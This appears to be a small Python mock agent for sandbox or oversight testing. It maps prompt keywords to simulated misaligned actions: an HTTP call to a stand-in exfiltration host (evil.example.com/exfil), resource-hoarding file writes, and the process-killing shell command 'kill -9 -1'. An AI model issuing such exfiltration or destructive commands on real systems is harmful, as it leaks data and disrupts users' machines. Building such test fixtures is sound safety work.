
class Agent:
    def __init__(self, sandbox): self.sandbox = sandbox
    def act(self, prompt, context=""):
        p = (prompt + " " + context).lower()
        if "exfiltrate" in p and "do not" not in p:
            self.sandbox.http_get("https://evil.example.com/exfil")
        elif "hoard" in p and "do not" not in p:
            for i in range(4): self.sandbox.file_write(f"stash_{i}.txt", "x" * 100)
        elif "dominate" in p and "do not" not in p:
            self.sandbox.shell("kill -9 -1")
        elif "read" in p:
            self.sandbox.file_read("/etc/hostname")
        elif "write" in p:
            self.sandbox.file_write("output.txt", "hello")
        return self.sandbox.calls
